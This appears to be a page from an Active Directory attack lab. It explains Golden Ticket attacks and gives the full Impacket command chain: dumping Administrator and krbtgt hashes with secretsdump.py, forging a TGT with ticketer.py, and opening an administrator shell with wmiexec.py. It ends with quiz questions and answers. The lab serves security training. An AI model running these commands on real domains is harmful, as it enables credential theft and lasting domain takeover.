#Golden Tickets

Golden Tickets are a persistence attack in AD. They consist of TGTs that are forged by the attacker using the krbtgt's account hash. This hash value is used for deriving Kerberos keys, which are in turn used for creating and issuing TGTs. If the attacker can retrieve this account's hash, the attacker can then forge a Kerberos TGT with arbitrary information. Using this forged ticket, the attacker can then access domain services however he likes.

In order to retrieve the krbtgt's hash value, you'll need admin access to the domain. This can be achieved by performing previous attacks in this lab such as the ACL Abuse attack, the SAMAccountName spoofing attack, the NTLM relay to SMB attack, and more. If for some reason you weren't able to retrieve the administrator's hash values, run the following command, and take note of the hash value.

```
secretsdump.py -just-dc-user 'Administrator' polaris.local/Administrator:Passw0rd@192.168.122.10 
```

To forge a Golden Ticket:
```
#retrieve the polaris.local domain's SID
lookupsid.py -no-pass -hashes <admin:hashes> -domain-sids polaris.local/Administrator@192.168.122.10 0
#get the krbtgt account hash
secretsdump.py -just-dc-user 'krbtgt' polaris.local/administrator@192.168.122.10 -hashes <admin:hashes>
#example output
#[+] krbtgt:502:aad3b435b51404eeaad3b435b51404ee:640464e963ce78864650de778a6b9c31:::
#in the command below, you must use the NT hash, which in the example output i gave you, is the second value (640464e963ce78864650de778a6b9c31)
ticketer.py -nthash <krbtgt's NTHash> -domain-sid <domain SID> -domain polaris.local Administrator
#At this point you've crafted a golden ticket, a TGT referencing the administrator account, which can be used to access any service in the domain as the administrator, for a long period of time
export KRB5CCNAME=/your/dir/Administrator.ccache
#Create a shell session using the forged ticket with administrator permissions
wmiexec.py -k -no-pass polaris.local/Administrator@captain.polaris.local
whoami
```

!!! question
    What is a Golden Ticket in Active Directory?
??? success "Answer"
    A Golden Ticket is a forged Kerberos Ticket Granting Ticket (TGT) created using the krbtgt account’s NT hash. With it, an attacker can impersonate any user, including Domain Admins, and access domain resources at will.
!!! question
    Why is the krbtgt account hash required to forge a Golden Ticket?
??? success "Answer"
    The krbtgt account hash is the secret key the KDC uses to sign and validate TGTs. If an attacker has this hash, they can generate valid-looking TGTs that the KDC will accept as legitimate.
!!! question
    How can an attacker retrieve the krbtgt account hash?
??? success "Answer"
    The attacker needs domain admin–level access to dump the krbtgt account credentials. This can be achieved through other attacks such as ACL abuse, SAMAccountName spoofing or NTLM relay to SMB.